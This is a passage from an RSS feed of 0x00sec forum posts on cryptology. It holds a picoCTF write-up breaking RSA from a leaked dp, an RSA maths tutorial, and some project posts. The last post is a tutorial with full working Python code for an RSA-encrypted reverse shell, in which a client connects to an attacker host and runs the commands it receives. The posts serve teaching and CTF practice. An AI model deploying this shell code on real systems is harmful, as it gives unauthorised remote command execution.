282.282.307.287.285.305.297.275.306.280.292.291.284.301.278.293.296.277.301.281.274.315.281.254.251.289.313.307.244.256.302.301.317.305.239.316.274.277.296.269.305.301.279.287.317.284.277.305.298.264.304.286.273.275.293.309.286.282.240.287.239.268.269.267.315.311.292.270.271.272.336.282.237.275.316.306.239.305.314.240.296.306.270.247.245.302.317.316.241.291.310.266.274.274.313.288.262.319.280.276.238.297.295.287.285.288.301.272.275.247.305.292.286.272.310.291.301.322.256.315.298.263.281.276.237.294.284.296.284.302.273.298.287.298.301.265.305.270.315.278.283.302.287.263.270.345.258.270.266.302.309.262.260.277.327.263.277.254.283.276.239.272.264.276.279.264.267.298.264.244.245.273.292.289.273.248.259.263.288.290.294.210.288.268.311.318.312.242.285.293.216.262.276.340.292.299.275.259.293.311.234.266.294.278.307.286.267.307.285.269.310.288.274.270.326.273.276.311.304.267.302.318.265.299.263.283.248.257.314.288.321.321.236.284.283.227.320.312.246.261.289.316.288.263.312.241.265.288.298.286.287.274.306.279.276.289.307.303.293.281.298.317.252.312.283.278.263.304.305.258.266.270.294.286.293.290.291.291.258.254.282.282.283.313.268.282.316.310.299.254.264.234.296.270.265.326.288.292.293.321.305.250.320.299.253.270.296.297.298.266.312.234.273.287.309.286.278.269.279.316.284.276.234.293.255.267.242.253.318.270.246.278.292.285.282.314.266.292.286.263.313.249.290.255.289.264.292.301.299.278.291.292.225.250.261.283.303.262.264.264.303.299.297.274.288.267.293.316.320.317.233.303.258.302.271.283.323.247.279.268.312.269.297.313.280.280.273.266.332.276.313.284.281.316.279.290.273.313.308.305.260.302.306.273.234.279.281.284.298.278.259.290.314.275.264.339.293.322.266.261.296.306.277.275.311.284.270.318.259.249.286.292.301.285.280.303.283.287.299.277.273.293.228.311.283.272.304.292.277.271.306.302.278.298.300.287.281.309.243.272.279.282.300.291.295.284.285.252.291.251.285.283.245.250.252.318.298.277.235.288.259.263.278.274.307.261.260.350.250.288.256.282.316.261.285.295.292.300.298.264.245.241.308.301.261.253.289.264.267.300.262.248.287.257.266.275.287.297.320.287.264.279.297.232.231.256.288.243.252.277.274.245.256.253.229.290.263.305.278.260.294.312.283.301.275.276.299.297.312.275.282.294.272.228.302.324.257.261.286.326.280.283.316.294.254.258.275.264.236.240.277.255.231.258.286.242.277.253.296.290.250.314.320.239.292.313.261.294.261.317.273.285.236.292.282.271.264.297.300.272.308.299.300.269.301.269.317.284.286.262.315.276.279.328.269.254.252.232.272.268.309.273.264.296.305.272.267.291.324.302.297.268.268.263.298.300.261.312.241.254.299.280.263.292.260.301.311.317.297.248.314.272.293.298.281.298.276.311.291.297.318.261.274.300.293.297.267.295.261.275.334.289.238.267.289.283.257.300.262.304.311.278.274.265.261.345.301.296.270.273.299.289.274.272.313.282.268.320.287.320.270</p>
</blockquote>
<h3>The ‘hack’</h3>
<div class="spoiler"><a href="https://0x00sec.org/t/hts-org-r6-challenge/2001/1">spoiler</a></div>
<h1>Conclusions</h1>
<p>In this case we had a kinda tricky but not that difficult task to solve. We had to combine our knowledge about cryptography and basic character en- and decoding to decrypt the cipher. The html code of the website didn’t reveal anything to us, so it we had to solve it on our own <img src="/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"> .</p>
<p>The next article of the series can be found <a href="https://0x00sec.org/t/hts-org-r7-challenge/">here</a> once it’s up!!</p>
<p>Stay tuned <img src="/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/hts-org-r6-challenge/2001">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hts-org-r6-challenge/2001</link>
          <pubDate>Tue, 09 May 2017 13:20:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-2001</guid>
          <source url="https://0x00sec.org/t/hts-org-r6-challenge/2001.rss">HTS.org R6 challenge</source>
        </item>
        <item>
          <title>picoCTF Write-up ~ Pwning RSA (1/2)</title>
          <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>So as you might know, pysec, dtm, kowalski and me did the picoCTF some time back.<br>
One of the challenges we did was an RSA one.<br>
The challenge was as follows</p>
<pre><code class="lang-auto">e = 65537
n = 642313240848064014975043934308658242447312485152342673610756859535090103704610472004913349502648157091104463303511131278665176160214474038294042375555935567033107229886104534241324327133387923226576002115108963521725703773387678635509903034467838260875686083768549775481391190161412646384559222421917626615323
dp = 17765378008759755288183210466105878526943875374957170036175281330288884608317141953683920408636506981101765935449140323585600732241535721917282237462133813

c = 147903288008907053469880199469959588903705520519775597541160700501753344741954421604588338524905987922631822425828587114084662512860181022047137469441292833823381362238861070683420786510831001513730638949486694641768638258876688738949817816449109334961820861920165271653627904957302093274915248851406573361863
</code></pre>
<p>So as you might have seen in my previous article <a href="https://0x00sec.org/t/encryption-101-rsa-001-the-maths-behind-it/1921/1">here</a> we already know what e, n and c are.<br>
e is the public key<br>
n is the modulus<br>
and c is the ciphertext.<br>
But what’s this dp doing there?</p>
<p>Luckily there is <a href="http://www.di-mgt.com.au/crt_rsa.html" rel="nofollow noopener">this</a> site that has some valuable info.</p>
<p>It seems that dp is defined as:</p>
<pre><code class="lang-auto">dP = (1/e) mod (p-1)
</code></pre>
<p>but wait.<br>
Let’s pause here for a minute.<br>
Notice two things here:<br>
1/e ( inv(e) ) and (p-1).<br>
What would happen if we’d multiply this by e?</p>
<p>You’d get a 1 mod, mod what?</p>
<p>It’s gotta be a 1 mod a multiple of (p-1).<br>
So that means if you substract 1 from it, you’d get a multiple of (p-1).</p>
<p>But how does this help us and why would we even care about p?</p>
<p>Well from the other article I wrote that we know than n = p*q.<br>
And that to calculate d we need phi(n).<br>
If we manage to get p, we get q for free, since n / p = q.<br>
And with p and q we can calculate phi(n).<br>
With phi(n) we can calculate e^-1 which is d.<br>
Then with d we can calculate c^d mod n = m!!!</p>
<p>So it turns out that finding p is crucial for solving this challenge and having a multiple of (p-1) sounds like a great start!.</p>
<p>But how would be get p from this multiple of p-1?<br>
Use the computer!<br>
There are two ways to solve this.<br>
The one I used in the challenge was as following.</p>
<pre><code class="lang-auto">mp = (dp * e) - 1 #mp is multiple of p-1
for i in range(2,1000000):
   p = (mp / i) + 1
   if n % p == 0:
       break
print p
</code></pre>
<p>Another way would be as following</p>
<pre><code class="lang-auto">mp = (dp * e) - 1
#notice that mp is a multiple of p-1
#mp = k*(p-1) = kp - k
for i in range (2,1000000):
    kp = mp+i
    if gcd(n,kp) &gt; 0:
        p = gcd(n,kp)
        break
print p 
</code></pre>
<p>This final solution works, because the gcd of kp and n would p, since p would divide both kp and n.<br>
Having now found p. we can simple define q as</p>
<pre><code class="lang-auto">import gmpy2
q = n / p
phin = (p-1)*(q-1)
d = gmpy2.divm(1,e,phin)
m = gmpy2.powmod(c,d,n)
print m
</code></pre>
<p>Now m would still be very unreadable<br>
m = 3670434958110785066911905751469631231338751225710158680692616521935747246580687863838005016679513421330301</p>
<p>So let’s first convert it to hex using this nice site:<br>
<a href="http://www.mobilefish.com/services/big_number/big_number.php" class="onebox" target="_blank" rel="nofollow noopener">http://www.mobilefish.com/services/big_number/big_number.php</a></p>
<p>We now have 666C61677B776F775F6C65616B696E675F64705F627265616B735F7273613F5F37373436373139303435377D</p>
<p>So let’s move to this other cool site<br>
<a href="http://string-functions.com/hex-string.aspx" class="onebox" target="_blank" rel="nofollow noopener">http://string-functions.com/hex-string.aspx</a><br>
and so we get our flag:<br>
flag{wow_leaking_dp_breaks_rsa?_77467190457}</p>
<p>That’s it!</p>
<p>Next article we will cover another RSA challenge from the picoCTF</p>
            <p><small>6 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/picoctf-write-up-pwning-rsa-1-2/1923">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/picoctf-write-up-pwning-rsa-1-2/1923</link>
          <pubDate>Sun, 23 Apr 2017 16:14:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-1923</guid>
          <source url="https://0x00sec.org/t/picoctf-write-up-pwning-rsa-1-2/1923.rss">picoCTF Write-up ~ Pwning RSA (1/2)</source>
        </item>
        <item>
          <title>Encryption 101, RSA 001 (The maths behind it)</title>
          <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Zup folks, for the picoCTF we (dtm, pysec, kowalski and me), had to solve several crypto challenges.<br>
RSA being the most common subject.</p>
<p>So here I thought it’s time to share what I know about RSA, because it’s one of the most common algorithms seen in public key crypto.</p>
<p>First let’s start with a little story:<br>
Suppose you work for the CIA or NSA. The year is 1800 and computers weren’t yet invented. Some journalist is being threatened by Erdogan, but he has valuable info and you want to make sure he can send it to your office, without having to worry about some KGB trained Putin getting his hands on it. You could send a safe with a padlock and a key, but what if someone intercepts the key and makes a copy of it?, that’d be terrible.<br>
Luckily you meet 3 guys called Ron Rivest, Adi Shamir, and Leonard Adleman. They have an awesome invention. They have invented a padlock that uses two keys: one for unlocking and one for locking. Genius right?<br>
So now you send the unbreakable safe with this unbreakable padlock and the key for locking to this journalist and he can write his message (‘Send Nudes’) on a paper, put it in the box, lock the box with the padlock using the special key for locking and put it somewhere on a Ali Express delivery camel. Mission Succeeded!</p>
<p>The two key system is what make public key crypto so succesful, we would refer to the key for locking as the <code>public key</code> and the key for unlocking as the <code>private key</code>.</p>
<p>Here the idea is that we use a mathematical system / formula that is easy to calculate one way, but very hard to reverse. RSA uses such a formula, the idea is as follows:</p>
<p>Multiplying two very big numbers is easy, finding the original two big number with just the product of it is VERY hard (tedious).</p>
<p>Before we continue we have to cover some mathematics, it’s probably very unlike anything you’ve ever seen in school, but it’s not that hard.</p>
<p>#<span class="hashtag">#Muh</span> Maths</p>
<p>So let’s start off with looking at a very simple python program:</p>
<pre><code class="lang-python">import sys
a = int(sys.argv[1])
b = int(sys.argv[2])
n = int(sys.argv[3])
c = (a * b) % n
</code></pre>
<p>That’s it, this the mathematics behind RSA, it’s called <code>modular multiplication</code></p>
<p>In RSA you’ll usually work with really big numbers of several hundred digits<br>
Something you might see is the following calculation:<br>
<code>61447^28918293809555798793287493827982374 mod 9830849029834038402948</code><br>
(note that mod is the same as <code>%</code> earlier in the python program).</p>
<h2>Square and multiply</h2>
<p>So how could the computer calculate such  large number?<br>
A cool trick for this is called <code>square and multiply</code><br>
For example:<br>
<code>2^684343 mod 102</code><br>
This would be a way too big number if you’d try to calculate<br>
2^684343 first and then do mod 102.<br>
Luckily there are a few cool tricks in modular multiplication:<br>
<code>a^b mod c</code> is the same as <code>(a mod c)^b mod c</code> in MM (modular multiplication)<br>
So for example 103^999999999999999 mod 102<br>
is the same as (103 mod 102)^9999999999999999 mod 102 which is the same as:<br>
1^99999999999999999 mod 102 which is just 1.</p>
<p>So how does this property help us solve <code>2^684343 mod 102</code>?<br>
Well:</p>
<pre><code class="lang-auto">2^684343 mod 102 ==
2 * 2^684342 mod 102 ==
2 * (2^2)^342171 mod 102 ==
2 * 4^342171 mod 102 ==
2 * 4 * 4^342170 mod 102 ==
2 * 4 * (4^2)^171085 mod 102 ==
2 * 4 * 16^171085 mod 102 ==
2 * 4 * 16 * 16^171084 mod 102 ==
2 * 4 * 16 * (16^2)^85542 mod 102 ==
2 * 4 * 16 * 256^85542 mod 102 ==
2 * 4 * 16 * (256 mod 102)^85542 mod 102 ==
2 * 4 * 16 * 52^85542 mod 102 ==
2 * 4 * 16 * (52^2)^42771 mod 102 ==
2 * 4 * 16 * 2704^42771 mod 102 ==
2 * 4 * 16 * (2704 mod 102)^42771 mod 102 ==
2 * 4 * 16 * 52^42771 mod 102 ==
2 * 4 * 16 * 52 * 52^42770 mod 102 ==
2 * 4 * 16 * 52 * (52^2)^21385 mod 102 ==
2 * 4 * 16 * 52 * 2704^21385 mod 102 ==
2 * 4 * 16 * 52 * (2704 mod 102)^21385 mod 102 ==
2 * 4 * 16 * 52 * 52^21385 mod 102 ==
2 * 4 * 16 * 52^2 * 52^21384 mod 102 ==
etc etc
</code></pre>
<p>So this would be an approach to solving such big calculations, I hope you understood the method.</p>
<h2>Groups</h2>
<p>Now let’s have a look at <code>Groups</code><br>
Groups are a mathematical term for a set of elements with an operation defined for them.<br>
This may sound rather vague, but you already know some groups <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>For example, the real numbers with addition (R+) is a group.<br>
here the operation is ‘+’ as you know it and the numbers are the numbers as you know them. (1, 5, sqrt(5), pi etc).<br>
These are a group because the following properties hold:</p>
<ul>
<li>if <code>a</code> is in R+ and <code>b</code> is in R+, then so is <code>a + b</code>.</li>
<li>there is an element <code>0</code> in R+, such that for all <code>x</code> in R+, <code>x + 0 = x</code> (well obviously) This is the <code>identity</code> element.</li>
<li>for every <code>a</code> in R+, there is <code>inv(a)</code> in R+ (-a in this case) such that <code>a + inv(a) = 0</code> (a + -a = 0)</li>
<li>for every <code>a</code>, <code>b</code>  and <code>c</code> in R+, <code>(a + b) + c</code> = <code>a + (b + c)</code>
</li>
</ul>
<p>If this doesn’t make any sense, don’t worry, it just means that adding two numbers will result in a new number and that that number exists in the numbers.<br>
Also it means that for every number, there is a unique number, such that adding that number to the number does nothing to the number (for 4 + 0 = 4).<br>
And lastly it means that the order doesn’t matter:<br>
(2 + 4) + 4 is the same as<br>
2 + (4 + 4)</p>
<p>We will now look at the group <code>Zn*</code><br>
This may sound weird, but don’t mind the notation.<br>
Here Z mean the whole numbers (3, 5, -2, 2323232 etc)<br>
and * means multiplication.</p>
<p>The n here stands for the modulo.<br>
That means if n is 15 for example you’d have the group:<br>
Z15* (Just notation).<br>
So now rather than R+ with addition we have Zn with multiplication (Zn*).</p>
<p>The following things now hold for Zn*</p>
<ol>
<li>If a and b are Zn* then so is a * b</li>
<li>There is an element e in Zn* such that a * e = a (here it’s 1)</li>
<li>For every a in Zn* there is an a^-1 such that a * a^-1 = e</li>
</ol>
<p>Considering these criteria let’s look at Z8* (meaning n = 8 (Zn*) ).<br>
So what elements would be in Z8*?<br>
0 is not in it.<br>
After all according to rule 3 there must be an element in Z8* such that 0 * x = 1.<br>
This is never gonna be true so 0 can’t be in it.<br>
1 is in it.<br>
2 is not in it.<br>
if 2 is in Z8* then so is 2<em>2 according to rule 1. But then so is 2</em>2<em>2 = 8 mod 8 = 0, but we already found 0 is not in it.<br>
Another way to approach the question wether 2 is in it, is by looking at rule 3. There must be some x in Z8</em> such that<br>
2 * x mod 8 = 1.<br>
But since both 2 and 8 are even numbers, this is never gonna work out.<br>
Then with the same logic we know that 4, 6 and 8 are not in Z8*.<br>
After fiddling around a bit we will find that only 1,3,5 and 7 are in Z8*.<br>
That means that there are 4 numbers in Z8*.<br>
And that if you multiple any of these numbers the result will be <em><strong>one of these four numbers</strong></em></p>
<h2>The order of groups</h2>
<p>As we found earlier there are 4 elements in Z8*. We then say that the order of Z8* is 4.<br>
Notation: <code>#Z8* = 4</code> or <code>|Z8*| = 4</code>. Normally the order of a group Zn* can be tedious to find, but there are a few special cases:</p>
<ul>
<li>n is prime</li>
<li>n is the product of two or more prime numbers who are all different from each other.</li>
</ul>
<p>In this case we can use Eulers Totient Function. the notation for this is called phi(n)</p>
<p>So let’s look at the different cases discussed earlier</p>
<ol>
<li>If n is prime, then phi(n) is simply n-1</li>
<li>If n is the product of say p,q,r (n = p<em>q</em>r) then phi(n) is (p-1) * (q-1) * (r-1),<br>
If p,q,r,d… then just (p-1)(q-1)(r-1)(d-1)…</li>
</ol>
<p>Now why would we even care about Eulers Totient Equation?<br>
As it turns out, if n is the product of two prime numbers or n is prime the following holds:<br>
Let x be an element of Zn*, then x^phi(n) mod n = 1.</p>
<p>Back to RSA<br>
RSA works on this principle:<br>
Find two very large prime numbers <code>p</code> and <code>q</code>, where p != q.<br>
Then calculate <code>n</code> by multiplying p and q.<br>
calculate <code>phi(n)</code> by doing <code>(p-1)*(q-1)</code> (Eulers function).<br>
Now pick a nice public key <code>e</code> such that <code>e</code> is prime and <code>e</code> is rather small (like 62219).<br>
Now calculate the inverse of <code>e</code> modulo <code>phi(n)</code></p>
<h1>Muh math again</h1>
<p>Woops how do we calculate the inverse?<br>
Ez, use python, but since that’s trivial let’s do it by hand using a more simple example.<br>
Suppose you have p = 13 and q is 17.<br>
Then n = 13 * 17 = 170 + 21 + 30 = 221.<br>
Then phi(n) = 12 * 16 = 160 + 32 = 192.<br>
Now suppose you’ve chosen e = 7.<br>
So now you want to calculate inv(e) mod phi(n).<br>
There is a neat little trick for this.<br>
It goes as following:</p>
<pre><code class="lang-auto">  0 * 7 = 192 mod 192 (since 192 mod 192 = 0)
  1 * 7 =   7 mod 192
-27 * 7 =   3 mod 192 (0*7 - 27 * 1*7 -&gt; 192 - 189 = 2)
 55 * 7 =   1 mod 192 (1*7 -2(-27 * 7) -&gt; 7 - 2*3 = 1)  
</code></pre>
<p>So this means 55 is the inverse of 7 mod 192.<br>
Don’t worry if you don’t really understand this technique, it takes some brainfarts until you get it, but it’s not that important considering we have a computer who is perfectly capable of doing all this work for is. check out python’s gmpy2 module.</p>
<h2>Back to RSA</h2>
<p>So now that we know how to calculate the inverse let’s look at that RSA example once again.<br>
We had <code>e</code> = 62219 we use the computer to calculate inv(e) and find <code>d</code>.<br>
So now we have n,e and d. This is all you need to the RSA to work.<br>
Suppose you have a message <code>m</code> that you want to encrypt.<br>
The procedure is as follows the server gives you (n,e), it’s public key.<br>
You then calculate <code>c</code> =  m^e mod n.<br>
You then send this to the server.<br>
The server receives c and calculates m by doing c^d mod n = m.<br>
So why does this work?</p>
<p>Well remember that c = m^e.<br>
And that d = e^-1 mod phi(n)</p>
<p>(m^e)^(e^-1 mod phi(n) ) ==<br>
m^(e * e^-1 mod phi(n) ) ==<br>
m^(1 mod phi(n)) ==<br>
m^(phi(n)+1) ==<br>
m^phi(n) * m^1 ==<br>
1 * m^1 ==<br>
m^1 ==<br>
m</p>
<p>Awesome right?<br>
Let’s look at our previous example again where we had p = 13, q = 17, e = 7 and d = 55 n = 221.<br>
Suppose we want to encrypt the message <code>_</code> (a single spacebar) then in ascii that is 0x20, meaning 32 in decimals, so m = 32.</p>
<p>Then we calculate 32^7 mod 221 = 59<br>
we send 59 to the server and the server then calculates<br>
59^55 mod 221 = 32, yay success!</p>
<p>This was probably a bit messy, so please give me loads of feedback and I will keep improving this article.</p>
            <p><small>16 posts - 8 participants</small></p>
            <p><a href="https://0x00sec.org/t/encryption-101-rsa-001-the-maths-behind-it/1921">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/encryption-101-rsa-001-the-maths-behind-it/1921</link>
          <pubDate>Sun, 23 Apr 2017 15:06:10 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-1921</guid>
          <source url="https://0x00sec.org/t/encryption-101-rsa-001-the-maths-behind-it/1921.rss">Encryption 101, RSA 001 (The maths behind it)</source>
        </item>
        <item>
          <title>Asemica - An asemic Markov-chained cipher</title>
          <dc:creator><![CDATA[VoidAccess]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>This is a cool tool i found,thought i would share it with everyone-It’s called Asemica.</p>
<p><a href="https://github.com/linenoise/asemica" rel="nofollow noopener">Github Link</a></p>
<p><a href="https://n-o-d-e.net/clearnet.html" rel="nofollow noopener">Click me for more information</a></p>
<p>Definition: Asemica is a symmetric cipher whose key is a document and whose ciphertext looks like plaintext.</p>
<p><strong>Why use this?</strong><br>
One of the downsides of encrypting messages and emails is that few people are doing it,you will stick out like a sore thumb to anyone who is monitoring the data.<br>
For example, it’d be pretty easy to filter out all messages that contain PGP headers.</p>
<p>So,we use a cipher text which looks like plaintext,This plain text can be combined with PGP for added security.</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/asemica-an-asemic-markov-chained-cipher/1798">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/asemica-an-asemic-markov-chained-cipher/1798</link>
          <pubDate>Mon, 20 Mar 2017 06:23:16 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-1798</guid>
          <source url="https://0x00sec.org/t/asemica-an-asemic-markov-chained-cipher/1798.rss">Asemica - An asemic Markov-chained cipher</source>
        </item>
        <item>
          <title>&quot;Secure&quot; Client-Server Communications &quot;framework&quot;</title>
          <dc:creator><![CDATA[0x00_Jinx]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>With the recent “burst” in cryptography posts on 0x00sec, I’ve decided to start a, more or less, point of concept framework. Nothing in the program is going to be groundbreaking new security measures, but a collection of many of the best.</p>
<ul>
<li>
<p>The framework is going to be written in Python, and Cython.</p>
</li>
<li>
<p>Hosted on Github, I’m taking all suggestions and criticism that I can to make it better<br>
#<span class="hashtag">#Features</span><br>
As with all my projects, they are open source. It will provide as much flexibility as possible.<br>
<br></p>
</li>
<li>
<p>Server-client model</p>
</li>
<li>
<p>2048 bit RSA encryption (can be lowered or raised based on user needs)</p>
</li>
<li>
<p>The data is hashed before being sent, and the hash is encrypted with the sender’s private key, proving that the message came from the person that we believed sent it.</p>
</li>
<li>
<p>The hash, providing it was decrypted, will make sure the message wasn’t corrupted along the way</p>
</li>
<li>
<p>Data is decrypted within the server to perform, if configured, to filter data or search for keywords.</p>
</li>
</ul>
<hr>
<p>It’s been a while since I programmed and my skills are a bit rusty, so code checks are welcome.<br>
<a href="https://github.com/0x00secJinx/PAIN-framework" rel="nofollow noopener">Github for Project</a> (Updated first, but updates will be moved to GitLab after thorough testing)<br>
<a href="https://git.0x00sec.org/0x00secJINX/PAIN-framework">GitLab for Project</a></p>
<hr>
## Edit
Secure key exchange is absolutely something I am going to implement, but after the base form of the framework is complete. Any more suggestions of implementations are going into consideration.
            <p><small>11 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/secure-client-server-communications-framework/1426">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/secure-client-server-communications-framework/1426</link>
          <pubDate>Tue, 03 Jan 2017 22:16:41 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-1426</guid>
          <source url="https://0x00sec.org/t/secure-client-server-communications-framework/1426.rss">&quot;Secure&quot; Client-Server Communications &quot;framework&quot;</source>
        </item>
        <item>
          <title>Reverse shell in Python with RSA encryption</title>
          <dc:creator><![CDATA[Cal0X]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Hello,</p>
<p>This is a python tutorial on programming a reverse shell with RSA encryption. I like to mention that this post is more about understanding the cryptography involved in the shell rather than the shell itself. The github link is <a href="https://github.com/ca10x/RSA-reverse-shell" class="inline-onebox-loading" rel="noopener nofollow ugc">https://github.com/ca10x/RSA-reverse-shell</a>.</p>
<h2>Listener</h2>
<p>First we need a listener to handle all incoming connections. Here is the code of listener_rsa.py</p>
<pre><code class="lang-python">#!/usr/bin/python

from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Hash import SHA256
import socket
from thread import *
import sys
import pickle

#Generate public key and private key

random_generator = Random.new().read
key = RSA.generate(2048, random_generator)
public_key = key.publickey()

#Create socket and bind to accept connections

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(("0.0.0.0", 4444))
except socket.error, v:
    print "Binding failed. Error code : " + str(v[0]) + " Message " + v[1]
    sys.exit()


print "Socket bind complete"

s.listen(2)
print "[+] Listening to the incoming connection on port 4444..."

def clientthread_sendpublickey(client) :
    client.send(pickle.dumps(public_key))

def clienthandle(client) :
    while True :
        command = raw_input('~$ ')
        client.send(command)
        if command == 'quit' :
           break
        buf = client.recv(2048)
        encreply = pickle.loads(buf)
        print key.decrypt(encreply)

while True:
    (client, (ip, port)) = s.accept()
    print "Received connection from : ", ip
    start_new_thread(clientthread_sendpublickey, (client,))
    print "Public Key sent to", ip
    start_new_thread(clienthandle, (client,))
</code></pre>
<p>I use PyCrypto module for cryptography in Python. Go ahead and install it. I recommend pip to install the modules.</p>
<pre><code>$ sudo pip install pycrypto
</code></pre>
<p>Before we jump into the code let me explain you a bit about RSA encryption and it’s keys. RSA is an asymmetric encryption standard. It has two keys, public and private. In simple words, public key is used to encrypt the message and private key is used to decrypt. Below is a block diagram which describes the process</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/5/55cbbeca39a6914812029329b8240bdee50b0d9e.png" width="329" height="362"></p>
<p>If you are interested in mathematical working of RSA, then I recommend reading <a href="http://mathworld.wolfram.com/RSAEncryption.html" class="inline-onebox-loading" rel="noopener nofollow ugc">http://mathworld.wolfram.com/RSAEncryption.html</a> (Beware, for geeks only)</p>
<p>In the program above, a key is generated first which is also a private key.</p>
<pre><code class="lang-python">key = RSA.generate(2048, random_generator)
</code></pre>
<p>The function RSA.generate takes two arguments, first is the size of the key in bits and second is the random number usually generated using python random function. After the creation of private key, public key is extracted from it and stored in a variable for future use.</p>
<pre><code class="lang-python">public_key = key.publickey()
</code></pre>
<p>Sockets are created using socket module which is relatively simple. You can refer the official documentation of <a href="https://docs.python.org/2/library/socket.html" rel="noopener nofollow ugc">Python sockets</a> for this or even a simple Google search will do.</p>
<p>The socket is binded and waits for the connection incoming connection.</p>
<p><strong>Note - If you want to bind the socket in Linux to the port lesser than 1024, then you have to execute the script as root</strong>.</p>
<p>When a connection is received, a new thread is initialized to send the generated public key to the client so that it can encrypt the replies.</p>
<pre><code class="lang-python">def clientthread_sendpublickey(client) :
    client.send(pickle.dumps(public_key))
</code></pre>
<p>Why do we use pickle? Pickle is used to serialize and de-serialize the python objects. Since public_key is not a regular string, it must be pickled and then sent to the receiver.</p>
<p><strong>Warning - The pickle module is not secure against erroneous or maliciously constructed data.   Never unpickle data received from an untrusted or unauthenticated source.</strong></p>
<p>Once the public key is sent, another thread <code>clienthandle(client)</code>  is initialised to <code>while True :</code> loop which sends the command given to the receiver. The receiver runs the command and encrypts the output using public key. Then the output is pickled sent to the listener.<br>
The reply is unpickled, decrypted using the private key and printed on the screen.</p>
<pre><code class="lang-python">encreply = pickle.loads(buf)
print key.decrypt(encreply)
</code></pre>
<p>The connection is terminated if ‘quit’ command is given.</p>
<p>#<span class="hashtag">#Reverse</span> shell</p>
<p>Let’s move on to the receiver’s end where the reverse shell resides. The script of the reverse_shell_rsa is given below</p>
<pre><code class="lang-python">#!/usr/bin/python

import socket, subprocess, sys
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import pickle


RHOST = sys.argv[1]
RPORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

def receive_key():
   data_key = s.recv(1024)
   return data_key

pickled_publickey = receive_key()
public_key = pickle.loads(pickled_publickey)


while True :
    command = s.recv(1024)
    if command == 'quit' :
         break
    reply = subprocess.Popen(str(command), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = reply.communicate()
    en_reply = public_key.encrypt(stdout, 32)
    s.send(pickle.dumps(en_reply))

s.close()
</code></pre>
<p>As always, import the necessary modules. The IP address to connect to is given as an argument and is stored in the RHOST variable. Socket is created and the connection is made with the server (listener). As soon as the connection is accepted, the server sends the public key (Scroll up to the <code>clientthread_sendpublickey()</code> in listener.py script) which is received via function receive_key()  and depickled (remember the pickling?) to obtain the public key.</p>
<pre><code class="lang-python">def receive_key():
   data_key = s.recv(1024)
   return data_key

pickled_publickey = receive_key()
public_key = pickle.loads(pickled_publickey)
</code></pre>
<p>A <code>while True</code> loop is initialized for the persistence of the connection and command is received. If the command is ‘quit’ then the show is over. Else the given command is run as a subprocess and the standard output, standard error is piped as to the variable ‘reply’. The standard output is then encrypted using the public key, pickled and sent to the server.</p>
<pre><code class="lang-python">en_reply = public_key.encrypt(stdout, 32)
s.send(pickle.dumps(en_reply))
</code></pre>
<p>It then waits patiently until the next command.</p>
<p>#<span class="hashtag">#Important</span> note</p>
<ul>
<li>
<p>This method is the implementation of ‘textbook RSA’. For the real world implementation, you have to add paddings such as PKCS1_OAEP.</p>
</li>
<li>
<p>The RSA is a lot slower and it can encrypt only 256 bytes at a time. Why you ask? Because the value of n is 2048 and 2048/8 = 256. The threshold will lower if the padding is added since it takes up couple more bytes.</p>
</li>
</ul>
<p>The workaround is that the RSA should be used over AES.</p>
<p>I’ll explain that concept in the next post. Since this is my first post, feedbacks are welcome and appreciated.</p>
<p>Happy new year folks!</p>
<p>Regards,</p>
<p>Cal0X</p>
            <p><small>5 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414</link>
          <pubDate>Sat, 31 Dec 2016 16:06:05 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
